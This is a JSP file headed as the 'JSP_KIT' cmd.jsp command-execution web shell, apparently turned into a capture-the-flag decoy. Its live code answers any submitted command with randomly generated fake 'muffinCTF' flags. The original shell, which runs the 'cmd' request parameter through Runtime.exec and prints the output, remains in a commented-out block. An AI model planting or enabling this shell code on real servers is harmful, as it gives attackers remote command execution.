<%@ page import="java.util.*,java.io.*,java.security.*"%>
<%
    //
// JSP_KIT
//
// cmd.jsp = Command Execution (unix)
//
// by: Unknown
// modified: 27/06/2003
//
%>
<HTML><BODY>
<FORM METHOD="GET" NAME="myform" ACTION="">
    <INPUT TYPE="text" NAME="cmd">
    <INPUT TYPE="submit" VALUE="Send">
</FORM>
<pre>
<%
    if (request.getParameter("cmd") != null) {
	Random random = new Random();
        int amount = random.nextInt(100);
        for( int i = 0; i < amount; i++) {
                MessageDigest md = MessageDigest.getInstance("SHA-1");
                byte[] rand = new byte[32];
                random.nextBytes(rand);
                md.update(rand);
                byte[] hashBytes = md.digest();
                StringBuffer hash = new StringBuffer();
                for (byte b : hashBytes) hash.append(Integer.toString((b & 0xFF) + 0x100, 16).substring(1));
                out.println("muffinCTF{" + hash + "}");
        }
        /*out.println("Command: " + request.getParameter("cmd") + "<BR>");
        Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));
        OutputStream os = p.getOutputStream();
        InputStream in = p.getInputStream();
        DataInputStream dis = new DataInputStream(in);
        String disr = dis.readLine();
        while ( disr != null ) {
            out.println(disr);
            disr = dis.readLine();
        }*/
    }
%>
</pre>
</BODY></HTML>
